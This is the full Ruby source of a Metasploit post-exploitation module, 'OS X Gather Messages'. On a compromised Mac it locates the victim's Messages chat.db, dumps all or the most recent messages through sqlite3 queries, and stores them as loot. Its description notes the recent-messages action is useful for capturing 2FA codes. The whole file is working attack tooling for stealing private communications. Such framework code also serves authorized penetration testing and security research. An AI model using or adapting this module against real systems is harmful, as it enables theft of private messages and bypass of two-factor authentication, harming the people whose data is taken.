##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'OS X Gather Messages',
      'Description'   => %q{
        This module will collect the Messages sqlite3 database files and chat logs
        from the victim's machine. There are four actions you may choose: DBFILE,
        READABLE, LATEST, and ALL. DBFILE and READABLE will retrieve all messages, and
        LATEST will retrieve the last X number of messages (useful with 2FA). Module
        was tested with OS X 10.11 (El Capitan).
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Geckom <geckom[at]redteamr.com>'],
      'Platform'      => ['osx'],
      'SessionTypes'  => ['meterpreter', 'shell'],
      'Actions'       =>
        [
          ['DBFILE',   'Description' => 'Collect Messages DB file'],
          ['READABLE', 'Description' => 'Collect Messages DB and download in a readable format'],
          ['LATEST',   'Description' => 'Collect the latest message'],
          ['ALL',      'Description' => 'Collect all Messages data']
        ],
      'DefaultAction' => 'ALL'
    ))

    register_options(
      [
        OptInt.new('MSGCOUNT', [false, 'Number of latest messages to retrieve.', 3]),
        OptString.new('USER',  [false, 'Username to retrieve messages from (defaults to current user)'])
      ]
    )
  end

  def run
    if datastore['USER']
      user = datastore['USER']
    else
      user = cmd_exec('/usr/bin/whoami')
    end

    # Check file exists
    messages_path = "/Users/#{user}/Library/Messages/chat.db"
    if file_exist?(messages_path)
      print_good("#{peer} - Messages DB found: #{messages_path}")
    else
      fail_with(Failure::Unknown, "#{peer} - Messages DB does not exist")
    end

    # Check messages.  And then set the default profile path
    unless messages_path
      fail_with(Failure::Unknown, "#{peer} - Unable to find messages, will not continue")
    end

    print_good("#{peer} - Found Messages file: #{messages_path}")

    files = []

    # Download file
    files << get_db(messages_path) if action.name =~ /ALL|DBFILE/i
    files << readable(messages_path) if action.name =~ /ALL|READABLE/i
    files << latest(messages_path) if action.name =~ /ALL|LATEST/i

    save(files)
  end

  #
  # Collect messages db file.
  #
  def get_db(messages_path)
    print_status("#{peer} - Looting #{messages_path} database")
    message_data = read_file(messages_path)
    {filename: 'messages.db', mime: 'bin', data: message_data}
  end

  #
  # Generate a readable version of the messages DB
  #
  def readable(messages_path)
    print_status("#{peer} - Generating readable format")
    sql = [
      'SELECT datetime(m.date + strftime("%s", "2001-01-01 00:00:00"), "unixepoch", "localtime")  || " " ||',
      'case when m.is_from_me = 1 then "SENT" else "RECV" end || " " ||',
      'usr.id || ": " || m.text, a.filename',
      'FROM chat as c',
      'INNER JOIN chat_message_join AS cm ON cm.chat_id = c.ROWID',
      'INNER JOIN message AS m ON m.ROWID = cm.message_id',
      'LEFT JOIN message_attachment_join AS ma ON ma.message_id = m.ROWID',
      'LEFT JOIN attachment as a ON a.ROWID = ma.attachment_id',
      'INNER JOIN handle usr ON m.handle_id = usr.ROWID',
      'ORDER BY m.date;'
    ]
    sql = sql.join(' ')
    readable_data = cmd_exec("sqlite3 #{messages_path} '#{sql}'")
    {filename: 'messages.txt', mime: 'text/plain', data: readable_data}
  end

  #
  # Generate a latest messages in readable format from the messages DB
  #
  def latest(messages_path)
    print_status("#{peer} - Retrieving latest messages")
    sql = [
      'SELECT datetime(m.date + strftime("%s", "2001-01-01 00:00:00"), "unixepoch", "localtime")  || " " ||',
      'case when m.is_from_me = 1 then "SENT" else "RECV" end || " " ||',
      'usr.id || ": " || m.text, a.filename',
      'FROM chat as c',
      'INNER JOIN chat_message_join AS cm ON cm.chat_id = c.ROWID',
      'INNER JOIN message AS m ON m.ROWID = cm.message_id',
      'LEFT JOIN message_attachment_join AS ma ON ma.message_id = m.ROWID',
      'LEFT JOIN attachment as a ON a.ROWID = ma.attachment_id',
      'INNER JOIN handle usr ON m.handle_id = usr.ROWID',
      "ORDER BY m.date DESC LIMIT #{datastore['MSGCOUNT']};"
    ]
    sql = sql.join(' ')
    latest_data = cmd_exec("sqlite3 #{messages_path} '#{sql}'")
    print_good("#{peer} - Latest messages: \n#{latest_data}")
    {filename: 'latest.txt', mime: 'text/plain', data: latest_data}
  end

  #
  # Do a store_root on all the data collected.
  #
  def save(data)
    data.each do |e|
      e[:filename] = e[:filename].gsub(/\\ /,'_')
      p = store_loot(
        e[:filename],
        e[:mime],
        session,
        e[:data],
        e[:filename])

      print_good("#{peer} - #{e[:filename]} stored as: #{p}")
    end
  end
end
